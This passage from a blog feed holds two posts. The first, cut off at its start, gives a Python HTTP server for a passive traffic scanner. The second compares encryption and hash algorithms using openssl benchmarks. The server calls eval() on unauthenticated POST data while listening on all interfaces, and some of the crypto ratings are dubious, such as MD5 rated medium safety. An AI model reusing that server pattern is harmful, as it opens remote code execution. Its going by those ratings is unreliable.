<p>I put my server code below:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> lib.redisopt <span class="keyword">import</span> content_deal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_set_response</span>(<span class="params">self</span>):</span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/html&#x27;</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        self.wfile.write(<span class="string">&quot;GET request for &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.headers).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_length = <span class="built_in">int</span>(self.headers[<span class="string">&#x27;Content-Length&#x27;</span>]) <span class="comment"># &lt;--- Gets the size of data</span></span><br><span class="line">        post_data = self.rfile.read(content_length) <span class="comment"># &lt;--- Gets the data itself</span></span><br><span class="line">        receive_data = <span class="built_in">eval</span>(post_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        req_url = receive_data[<span class="string">&#x27;req_url&#x27;</span>]</span><br><span class="line">        req_headers, req_body = receive_data[<span class="string">&#x27;req_headers&#x27;</span>], receive_data[<span class="string">&#x27;req_body&#x27;</span>]</span><br><span class="line">        req_host = receive_data[<span class="string">&#x27;req_host&#x27;</span>]</span><br><span class="line">        req_method = receive_data[<span class="string">&#x27;req_method&#x27;</span>]</span><br><span class="line">        data = receive_data[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">        content_deal(req_headers, req_host, req_method, postdata=req_body, uri=req_url, packet=data)</span><br><span class="line"></span><br><span class="line">        self.wfile.write(<span class="string">&quot;POST request for &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.headers).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">server_class=HTTPServer, handler_class=S, port=<span class="number">8888</span></span>):</span><br><span class="line">    logging.basicConfig(level=logging.INFO)</span><br><span class="line">    server_address = (<span class="string">&#x27;0.0.0.0&#x27;</span>, port)</span><br><span class="line">    httpd = server_class(server_address, handler_class)</span><br><span class="line">    logging.info(<span class="string">&#x27;Starting httpd...\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    httpd.server_close()</span><br><span class="line">    logging.info(<span class="string">&#x27;Stopping httpd...\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(argv) == <span class="number">2</span>:</span><br><span class="line">        run(port=<span class="built_in">int</span>(argv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        run()</span><br></pre></td></tr></table></figure>

<p>The function content_deal() is declared in the passive scanner system which written in python.</p>
<p>one last thing we should pay attention to is that if we decide to use BurpSuite to transfer the https data, we must import the BurpSuite certificate. Of course, in addition to using BurpSuite, we also have many other choices, such as sslsplit, mitmproxy…and we need to import the right certificates by the same.</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Cryptography - Comparison of Encryption Algorithms</title>
    <url>/2021/01/16/Cryptography-Comparison-of-Encryption-Algorithms/</url>
    <content><![CDATA[<h2 id="Symmetric-Encryption-Algorithm"><a href="#Symmetric-Encryption-Algorithm" class="headerlink" title="Symmetric Encryption Algorithm"></a>Symmetric Encryption Algorithm</h2><table>
<thead>
<tr>
<th align="center">Algorithm</th>
<th align="center">Key Length</th>
<th align="center">Encryption Strength</th>
<th align="center">Performance</th>
<th align="center">Quantum Computing Resistance</th>
<th align="center">Copyright</th>
</tr>
</thead>
<tbody><tr>
<td align="center">DES</td>
<td align="center">56</td>
<td align="center">Weak</td>
<td align="center">Fast</td>
<td align="center">Weak</td>
<td align="center">United States</td>
</tr>
<tr>
<td align="center">3DES</td>
<td align="center">168</td>
<td align="center">Medium</td>
<td align="center">Slow</td>
<td align="center">Medium</td>
<td align="center">United States</td>
</tr>
<tr>
<td align="center">IDEA</td>
<td align="center">128</td>
<td align="center">Strong</td>
<td align="center">Medium</td>
<td align="center">Medium</td>
<td align="center">Switzerland</td>
</tr>
<tr>
<td align="center">AES</td>
<td align="center">128/192/256</td>
<td align="center">Strong</td>
<td align="center">Fast</td>
<td align="center">Strong</td>
<td align="center">United States</td>
</tr>
<tr>
<td align="center">SM1</td>
<td align="center">128</td>
<td align="center">Strong</td>
<td align="center">?</td>
<td align="center">Medium</td>
<td align="center">China</td>
</tr>
<tr>
<td align="center">SM4</td>
<td align="center">128</td>
<td align="center">Strong</td>
<td align="center">Medium</td>
<td align="center">Medium</td>
<td align="center">China</td>
</tr>
</tbody></table>
<p>The symmetric algorithms are usually implemented by block cipher. The modes of operation of block cipher include ECB, CBC, OFB, CFB, CTR.</p>
<h3 id="Pros-and-Cons-of-Modes-of-Operation"><a href="#Pros-and-Cons-of-Modes-of-Operation" class="headerlink" title="Pros and Cons of Modes of Operation"></a>Pros and Cons of Modes of Operation</h3><h4 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h4><ul>
<li><p>Good points: Very simple, encryption and decryption can be run in parallel.</p>
</li>
<li><p>Bad points: Horribly insecure.</p>
</li>
</ul>
<h4 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h4><ul>
<li><p>Good points: Secure when used properly, parallel decryption.</p>
</li>
<li><p>Bad points: No parallel encryption, susceptible to malleability attacks when authenticity checks are bad / missing. But when done right, it’s very good.</p>
</li>
</ul>
<h4 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h4><ul>
<li><p>Good points: Keystream can be computed in advance, fast hardware implementations available.</p>
</li>
<li><p>Bad points: Security model is questionable, some configurations lead to short keystream cycles.</p>
</li>
</ul>
<h4 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h4><ul>
<li><p>Good points: Small footprint, parallel decryption.</p>
</li>
<li><p>Bad points: Not commonly implemented or used.</p>
</li>
</ul>
<h4 id="CTR"><a href="#CTR" class="headerlink" title="CTR"></a>CTR</h4><ul>
<li><p>Good points: Secure when done right, parallel encryption and decryption.</p>
</li>
<li><p>Bad points: Not many. Some question the security of the “related plaintext” model but it’s generally considered to be safe.</p>
</li>
</ul>
<h3 id="Performance-Comparison"><a href="#Performance-Comparison" class="headerlink" title="Performance Comparison"></a>Performance Comparison</h3><p>The performance evaluation is based on the image file which has a size of 10M with 100 encryption/decryption times.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dd if=/dev/zero of=foo.bin bs=1024 count=10240</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;DES Encryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -des-cbc -in foo.bin -out foo_des.enc -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;DES Decryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -d -des-cbc -in foo_des.enc -out foo_des.dec -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;DES Total&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -des-cbc -in foo.bin -out foo_des.enc -k &quot;123456&quot; 2&gt; /dev/null; openssl enc -d -des-cbc -in foo_des.enc -out foo_des.dec -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;3DES Encryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -des-ede3-cbc -in foo.bin -out foo_3des.enc -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;3DES Decryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -d -des-ede3-cbc -in foo_3des.enc -out foo_3des.dec -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;3DES Total&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -des-ede3-cbc -in foo.bin -out foo_3des.enc -k &quot;123456&quot; 2&gt; /dev/null; openssl enc -d -des-ede3-cbc -in foo_3des.enc -out foo_3des.dec -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;AES-128 Encryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -aes-128-cbc -in foo.bin -out foo_aes.enc -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;AES-128 Decryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -d -aes-128-cbc -in foo_aes.enc -out foo_aes.dec -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;AES-128 Total&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -aes-128-cbc -in foo.bin -out foo_aes.enc -k &quot;123456&quot; 2&gt; /dev/null; openssl enc -d -aes-128-cbc -in foo_aes.enc -out foo_aes.dec -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;IDEA Encryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -idea-cbc -in foo.bin -out foo_idea.enc -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;IDEA Decryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -d -idea-cbc -in foo_idea.enc -out foo_idea.dec -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;IDEA Total&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -idea-cbc -in foo.bin -out foo_idea.enc -k &quot;123456&quot; 2&gt; /dev/null; openssl enc -d -idea-cbc -in foo_idea.enc -out foo_idea.dec -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;SM4 Encryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -sm4-cbc -in foo.bin -out foo_sm4.enc -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;SM4 Decryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -d -sm4-cbc -in foo_sm4.enc -out foo_sm4.dec -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;SM4 Total&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl enc -sm4-cbc -in foo.bin -out foo_sm4.enc -k &quot;123456&quot; 2&gt; /dev/null; openssl enc -d -sm4-cbc -in foo_sm4.enc -out foo_sm4.dec -k &quot;123456&quot; 2&gt; /dev/null; done</span><br><span class="line">echo</span><br></pre></td></tr></table></figure>
<p>Processing time:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DES Encryption</span><br><span class="line"></span><br><span class="line">real	0m19.798s</span><br><span class="line">user	0m15.806s</span><br><span class="line">sys 	0m2.213s</span><br><span class="line"></span><br><span class="line">DES Decryption</span><br><span class="line"></span><br><span class="line">real	0m18.558s</span><br><span class="line">user	0m14.891s</span><br><span class="line">sys 	0m2.120s</span><br><span class="line"></span><br><span class="line">DES Total</span><br><span class="line"></span><br><span class="line">real	0m36.998s</span><br><span class="line">user	0m30.519s</span><br><span class="line">sys 	0m4.182s</span><br><span class="line"></span><br><span class="line">3DES Encryption</span><br><span class="line"></span><br><span class="line">real	0m42.567s</span><br><span class="line">user	0m39.381s</span><br><span class="line">sys 	0m2.057s</span><br><span class="line"></span><br><span class="line">3DES Decryption</span><br><span class="line"></span><br><span class="line">real	0m42.357s</span><br><span class="line">user	0m39.157s</span><br><span class="line">sys 	0m2.079s</span><br><span class="line"></span><br><span class="line">3DES Total</span><br><span class="line"></span><br><span class="line">real	1m26.153s</span><br><span class="line">user	1m18.972s</span><br><span class="line">sys 	0m4.405s</span><br><span class="line"></span><br><span class="line">AES-128 Encryption</span><br><span class="line"></span><br><span class="line">real	0m5.158s</span><br><span class="line">user	0m2.071s</span><br><span class="line">sys 	0m1.889s</span><br><span class="line"></span><br><span class="line">AES-128 Decryption</span><br><span class="line"></span><br><span class="line">real	0m4.610s</span><br><span class="line">user	0m0.858s</span><br><span class="line">sys 	0m1.913s</span><br><span class="line"></span><br><span class="line">AES-128 Total</span><br><span class="line"></span><br><span class="line">real	0m9.679s</span><br><span class="line">user	0m2.949s</span><br><span class="line">sys 	0m3.857s</span><br><span class="line"></span><br><span class="line">IDEA Encryption</span><br><span class="line"></span><br><span class="line">real	0m16.199s</span><br><span class="line">user	0m12.710s</span><br><span class="line">sys 	0m2.071s</span><br><span class="line"></span><br><span class="line">IDEA Decryption</span><br><span class="line"></span><br><span class="line">real	0m15.285s</span><br><span class="line">user	0m12.005s</span><br><span class="line">sys 	0m2.177s</span><br><span class="line"></span><br><span class="line">IDEA Total</span><br><span class="line"></span><br><span class="line">real	0m31.202s</span><br><span class="line">user	0m24.840s</span><br><span class="line">sys 	0m4.256s</span><br><span class="line"></span><br><span class="line">SM4 Encryption</span><br><span class="line"></span><br><span class="line">real	0m14.580s</span><br><span class="line">user	0m11.490s</span><br><span class="line">sys 	0m2.050s</span><br><span class="line"></span><br><span class="line">SM4 Decryption</span><br><span class="line"></span><br><span class="line">real	0m13.979s</span><br><span class="line">user	0m10.965s</span><br><span class="line">sys 	0m2.020s</span><br><span class="line"></span><br><span class="line">SM4 Total</span><br><span class="line"></span><br><span class="line">real	0m29.145s</span><br><span class="line">user	0m22.644s</span><br><span class="line">sys 	0m4.270s</span><br></pre></td></tr></table></figure>

<h4 id="Encryption-Performance"><a href="#Encryption-Performance" class="headerlink" title="Encryption Performance"></a>Encryption Performance</h4><img src="/2021/01/16/Cryptography-Comparison-of-Encryption-Algorithms/pic_1.png" width="80%" height="80%">

<h4 id="Decryption-Performance"><a href="#Decryption-Performance" class="headerlink" title="Decryption Performance"></a>Decryption Performance</h4><img src="/2021/01/16/Cryptography-Comparison-of-Encryption-Algorithms/pic_2.png" width="80%" height="80%">

<h4 id="Total-Performance"><a href="#Total-Performance" class="headerlink" title="Total Performance"></a>Total Performance</h4><img src="/2021/01/16/Cryptography-Comparison-of-Encryption-Algorithms/pic_3.png" width="80%" height="80%">

<h2 id="Asymmetric-Encryption-Algorithm"><a href="#Asymmetric-Encryption-Algorithm" class="headerlink" title="Asymmetric Encryption Algorithm"></a>Asymmetric Encryption Algorithm</h2><h3 id="Public-Key-Algorithm-Families-of-Practical-Relevance"><a href="#Public-Key-Algorithm-Families-of-Practical-Relevance" class="headerlink" title="Public-Key Algorithm Families of Practical Relevance"></a>Public-Key Algorithm Families of Practical Relevance</h3><ul>
<li><p><strong>Integer-Factorization Schemes</strong> Several public-key schemes are based on the fact that it is difficult to factor large integers. The most prominent representative of this algorithm family is RSA.</p>
</li>
<li><p><strong>Discrete Logarithm Schemes</strong> There are several algorithms which are based on what is known as the discrete logarithm problem in finite fields. The most prominent examples include the Diffie–Hellman key exchange, Elgamal encryption or the Digital Signature Algorithm (DSA).</p>
</li>
<li><p><strong>Elliptic Curve (EC) Schemes</strong> A generalization of the discrete logarithm algorithm are elliptic curve public-key schemes. The most popular examples include Elliptic Curve Diffie–Hellman key exchange (ECDH) and the Elliptic Curve Digital Signature Algorithm (ECDSA).</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">Algorithm</th>
<th align="center">Encryption Strength</th>
<th align="center">Key Generation Performance</th>
<th align="center">Encryption/Decryption Performance</th>
<th align="center">Quantum Computing Resistance</th>
<th align="center">Copyright</th>
</tr>
</thead>
<tbody><tr>
<td align="center">RSA</td>
<td align="center">Medium</td>
<td align="center">Slow</td>
<td align="center">Fast</td>
<td align="center">Low</td>
<td align="center">RSA Security LLC</td>
</tr>
<tr>
<td align="center">ECC</td>
<td align="center">Strong</td>
<td align="center">Fast</td>
<td align="center">Slow</td>
<td align="center">Low</td>
<td align="center">United States</td>
</tr>
<tr>
<td align="center">SM2</td>
<td align="center">Strong</td>
<td align="center">Fast</td>
<td align="center">Slow</td>
<td align="center">Low</td>
<td align="center">China</td>
</tr>
</tbody></table>
<p>The encryption strength is relative. e.g., ECC provides the same level of security as RSA or discrete logarithm systems with considerably shorter operands (approximately 160–256 bit vs. 1024–3072 bit). And the safety of RSA algorithm will significantly decrease against quantum computer.</p>
<h3 id="Main-Security-Mechanisms-of-Public-Key-Algorithms"><a href="#Main-Security-Mechanisms-of-Public-Key-Algorithms" class="headerlink" title="Main Security Mechanisms of Public-Key Algorithms"></a>Main Security Mechanisms of Public-Key Algorithms</h3><ul>
<li><p><strong>Key Establishment</strong> There are protocols for establishing secret keys over an insecure channel. Examples for such protocols include the Diffie–Hellman key exchange (DHKE) or RSA key transport protocols.</p>
</li>
<li><p><strong>Nonrepudiation</strong> Providing nonrepudiation and message integrity can be realized with digital signature algorithms, e.g., RSA, DSA or ECDSA.</p>
</li>
<li><p><strong>Identification</strong> We can identify entities using challenge-and-response protocols together with digital signatures, e.g., in applications such as smart cards for banking or for mobile phones.</p>
</li>
<li><p><strong>Encryption</strong> We can encrypt messages using algorithms such as RSA or Elgamal.</p>
</li>
</ul>
<h3 id="Performance-Comparison-1"><a href="#Performance-Comparison-1" class="headerlink" title="Performance Comparison"></a>Performance Comparison</h3><h4 id="Key-Generation-Performance"><a href="#Key-Generation-Performance" class="headerlink" title="Key Generation Performance"></a>Key Generation Performance</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;RSA Private Key Generation&quot; </span><br><span class="line">time for i in &#123;1..100&#125;; do openssl genrsa -out key_rsa.pem 2048 &amp;&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;RSA Public Key Generation&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl rsa -in key_rsa.pem -outform PEM -pubout -out public_rsa.pem &amp;&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;EC Private Key Generation&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl ecparam -name prime256v1 -genkey -noout -out key_ec.pem &amp;&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;EC Public Key Generation&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl ec -in key_ec.pem -pubout -out public_ec.pem &amp;&gt; /dev/null; done</span><br><span class="line">echo</span><br></pre></td></tr></table></figure>
<p>Processing time:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RSA Private Key Generation</span><br><span class="line"></span><br><span class="line">real	0m11.538s</span><br><span class="line">user	0m10.760s</span><br><span class="line">sys 	0m0.426s</span><br><span class="line"></span><br><span class="line">RSA Public Key Generation</span><br><span class="line"></span><br><span class="line">real	0m0.848s</span><br><span class="line">user	0m0.324s</span><br><span class="line">sys 	0m0.309s</span><br><span class="line"></span><br><span class="line">EC Private Key Generation</span><br><span class="line"></span><br><span class="line">real	0m0.877s</span><br><span class="line">user	0m0.343s</span><br><span class="line">sys 	0m0.318s</span><br><span class="line"></span><br><span class="line">EC Public Key Generation</span><br><span class="line"></span><br><span class="line">real	0m0.857s</span><br><span class="line">user	0m0.331s</span><br><span class="line">sys 	0m0.314s</span><br></pre></td></tr></table></figure>

<img src="/2021/01/16/Cryptography-Comparison-of-Encryption-Algorithms/pic_4.png" width="80%" height="80%">

<h4 id="Encryption-Decryption-Performance"><a href="#Encryption-Decryption-Performance" class="headerlink" title="Encryption/Decryption Performance"></a>Encryption/Decryption Performance</h4><p>ECC has no tools for encrypting and decrypting. ECC doesn’t define these directly. Instead, ECC users use Diffie-Hellman (DH) key exchange to compute a shared secret, then communicate using that shared secret. This combination of ECC and DH is called ECDH.<br>Here gives the ECC private key and public key generation and the shared secret key derivation.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl ecparam -name secp256k1 -genkey -noout -out alice_priv_key.pem</span><br><span class="line"></span><br><span class="line">openssl ec -in alice_priv_key.pem -pubout -out alice_pub_key.pem</span><br><span class="line"></span><br><span class="line">openssl ecparam -name secp256k1 -genkey -noout -out bob_priv_key.pem</span><br><span class="line"></span><br><span class="line">openssl ec -in bob_priv_key.pem -pubout -out bob_pub_key.pem</span><br><span class="line"></span><br><span class="line">openssl pkeyutl -derive -inkey alice_priv_key.pem -peerkey bob_pub_key.pem -out alice_shared_secret.bin</span><br><span class="line"></span><br><span class="line">openssl pkeyutl -derive -inkey bob_priv_key.pem -peerkey alice_pub_key.pem -out bob_shared_secret.bin</span><br></pre></td></tr></table></figure>
<p>If we take a look at the both shared secret keys we will find that they are the same.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">base64</span> alice_shared_secret.bin</span></span><br><span class="line">VBpMSs61mczMir4Ee9Glf0i9velLW6GIGTwcCa/mN68=</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">base64</span> bob_shared_secret.bin</span></span><br><span class="line">VBpMSs61mczMir4Ee9Glf0i9velLW6GIGTwcCa/mN68=</span><br></pre></td></tr></table></figure>
<p>The performance comparison script is shown below:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rand -hex -out randompassword 32</span><br><span class="line"></span><br><span class="line">echo &quot;RSA Encryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl rsautl -encrypt -inkey public_rsa.pem -pubin -in randompassword -out rsa.enc &amp;&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;RSA Decryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl rsautl -decrypt -inkey key_rsa.pem -in rsa.enc -out rsa.dec &amp;&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;RSA Total&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl rsautl -encrypt -inkey public_rsa.pem -pubin -in randompassword -out rsa.enc &amp;&gt; /dev/null; openssl rsautl -decrypt -inkey key_rsa.pem -in rsa.enc -out rsa.dec &amp;&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;ECC Encryption &amp; Decryption&quot;</span><br><span class="line">time for i in &#123;1..100&#125;; do openssl pkeyutl -derive -inkey alice_priv_key.pem -peerkey bob_pub_key.pem -out alice_shared_secret.bin &amp;&gt; /dev/null; openssl enc -aes-128-cbc -in randompassword -out randompassword.enc -kfile alice_shared_secret.bin 2&gt; /dev/null; openssl enc -d -aes-128-cbc -in randompassword.enc -out randompassword.dec -kfile alice_shared_secret.bin 2&gt; /dev/null; done</span><br><span class="line">echo</span><br></pre></td></tr></table></figure>
<p>Processing time:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RSA Encryption</span><br><span class="line"></span><br><span class="line">real	0m1.745s</span><br><span class="line">user	0m0.673s</span><br><span class="line">sys 	0m0.635s</span><br><span class="line"></span><br><span class="line">RSA Decryption</span><br><span class="line"></span><br><span class="line">real	0m1.996s</span><br><span class="line">user	0m0.919s</span><br><span class="line">sys 	0m0.646s</span><br><span class="line"></span><br><span class="line">RSA Total</span><br><span class="line"></span><br><span class="line">real	0m3.794s</span><br><span class="line">user	0m1.603s</span><br><span class="line">sys 	0m1.309s</span><br><span class="line"></span><br><span class="line">ECC Encryption &amp; Decryption</span><br><span class="line"></span><br><span class="line">real	0m5.047s</span><br><span class="line">user	0m1.935s</span><br><span class="line">sys 	0m1.797s</span><br></pre></td></tr></table></figure>

<img src="/2021/01/16/Cryptography-Comparison-of-Encryption-Algorithms/pic_5.png" width="80%" height="80%">

<h2 id="Comparable-Security-Strengths-of-Symmetric-Block-Cipher-and-Asymmetric-key-Algorithms"><a href="#Comparable-Security-Strengths-of-Symmetric-Block-Cipher-and-Asymmetric-key-Algorithms" class="headerlink" title="Comparable Security Strengths of Symmetric Block Cipher and Asymmetric-key Algorithms"></a>Comparable Security Strengths of Symmetric Block Cipher and Asymmetric-key Algorithms</h2><table>
<thead>
<tr>
<th align="center">Security Strength</th>
<th align="center">Symmetric Key Algorithms</th>
<th align="center">FFC (DSA, DH, MQV)</th>
<th align="center">IFC (RSA)</th>
<th align="center">ECC (ECDSA, EdDSA, DH, MQV)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">128</td>
<td align="center">AES-128</td>
<td align="center">L = 3072, N = 256</td>
<td align="center">k = 3072</td>
<td align="center">f = 256-383</td>
</tr>
<tr>
<td align="center">192</td>
<td align="center">AES-192</td>
<td align="center">L = 7680, N = 384</td>
<td align="center">k = 7680</td>
<td align="center">f = 384-511</td>
</tr>
<tr>
<td align="center">256</td>
<td align="center">AES-256</td>
<td align="center">L = 15360, N = 512</td>
<td align="center">k = 15360</td>
<td align="center">f = 512+</td>
</tr>
</tbody></table>
<h2 id="Hash-Algorithm"><a href="#Hash-Algorithm" class="headerlink" title="Hash Algorithm"></a>Hash Algorithm</h2><table>
<thead>
<tr>
<th align="center">Algorithm</th>
<th align="center">Length</th>
<th align="center">Conflict Probability</th>
<th align="center">Safety</th>
<th align="center">Performance</th>
<th align="center">Copyright</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">128</td>
<td align="center">Medium</td>
<td align="center">Medium</td>
<td align="center">Medium</td>
<td align="center">MIT</td>
</tr>
<tr>
<td align="center">SHA</td>
<td align="center">160/256</td>
<td align="center">Low</td>
<td align="center">High</td>
<td align="center">Medium</td>
<td align="center">United States</td>
</tr>
<tr>
<td align="center">SM3</td>
<td align="center">256</td>
<td align="center">Low</td>
<td align="center">High</td>
<td align="center">Slow</td>
<td align="center">China</td>
</tr>
</tbody></table>
<h3 id="Performance-Comparison-2"><a href="#Performance-Comparison-2" class="headerlink" title="Performance Comparison"></a>Performance Comparison</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;MD5 Hash&quot;</span><br><span class="line">time for i in &#123;1..1000&#125;; do openssl dgst -md5 foo.bin &amp;&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;SHA-256 Hash&quot;</span><br><span class="line">time for i in &#123;1..1000&#125;; do openssl dgst -sha256 foo.bin &amp;&gt; /dev/null; done</span><br><span class="line">echo</span><br><span class="line">echo &quot;SM3 Hash&quot;</span><br><span class="line">time for i in &#123;1..1000&#125;; do openssl dgst -sm3 foo.bin &amp;&gt; /dev/null; done</span><br><span class="line">echo</span><br></pre></td></tr></table></figure>
<p>Processing time:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MD5 Hash</span><br><span class="line"></span><br><span class="line">real	0m29.763s</span><br><span class="line">user	0m21.060s</span><br><span class="line">sys 	0m6.182s</span><br><span class="line"></span><br><span class="line">SHA-256 Hash</span><br><span class="line"></span><br><span class="line">real	0m39.433s</span><br><span class="line">user	0m30.555s</span><br><span class="line">sys 	0m6.302s</span><br><span class="line"></span><br><span class="line">SM3 Hash</span><br><span class="line"></span><br><span class="line">real	1m0.990s</span><br><span class="line">user	0m52.656s</span><br><span class="line">sys 	0m5.975s</span><br></pre></td></tr></table></figure>

<img src="/2021/01/16/Cryptography-Comparison-of-Encryption-Algorithms/pic_6.png" width="80%" height="80%">

<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>Christof Paar, 2010, <em>Understanding Cryptography</em>, Springer-Verlag Berlin Heidelberg</p>
<p><a href="https://jameshfisher.com/2017/04/14/openssl-ecc/">https://jameshfisher.com/2017/04/14/openssl-ecc/</a></p>
<p><a href="https://www.adrian.idv.hk/2018-08-07-openssl/">https://www.adrian.idv.hk/2018-08-07-openssl/</a></p>
<p><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf">https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf</a></p>
<p><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-56Cr1.pdf">https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-56Cr1.pdf</a></p>
<p><a href="https://dzone.com/articles/digital-signature-1">https://dzone.com/articles/digital-signature-1</a></p>
]]></content>
      <categories>
        <category>Cryptography</category>
      </categories>
      <tags>
        <tag>Encryption</tag>
        <tag>Cipher</tag>
      </tags>
  </entry>
  <entry>
    <title>Devices For Badusb And Badpowerbank</title>
    <url>/2019/01/11/Devices-For-Badusb-And-Badpowerbank/</url>
